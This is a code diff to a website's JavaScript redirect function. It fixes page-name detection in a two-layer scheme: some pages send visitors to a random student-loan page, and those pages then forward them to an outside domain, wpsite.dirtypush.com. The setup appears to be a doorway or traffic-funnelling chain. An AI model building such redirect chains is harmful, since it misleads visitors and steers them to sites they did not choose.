@@ -117,19 +117,27 @@ function goToSite3() {
     "student-loan-without-guarantor-india.html"
   ];
 
-  // 📍 current page name detect
-  const currentPage = window.location.pathname.split("/").pop();
+  // 🔥 correct current page detect
+  let currentPage = window.location.pathname;
 
-  // ✅ Layer 2 pages → FINAL LINK
+  // remove folder path
+  currentPage = currentPage.substring(currentPage.lastIndexOf("/") + 1);
+
+  // remove query params
+  currentPage = currentPage.split("?")[0];
+
+  console.log("Current Page:", currentPage);
+
+  // ✅ Layer 2 → FINAL
   if (layer2Pages.includes(currentPage)) {
 
     window.location.href = "https://wpsite.dirtypush.com/";
 
   } else {
 
-    // 🔥 Layer 1 pages → random Layer 2 page
+    // 🔥 Layer 1 → random Layer 2
     const randomPage = layer2Pages[Math.floor(Math.random() * layer2Pages.length)];
 
-    window.location.href = randomPage;
+    window.location.href = "/" + randomPage; // ✅ ROOT FIX
   }
 }
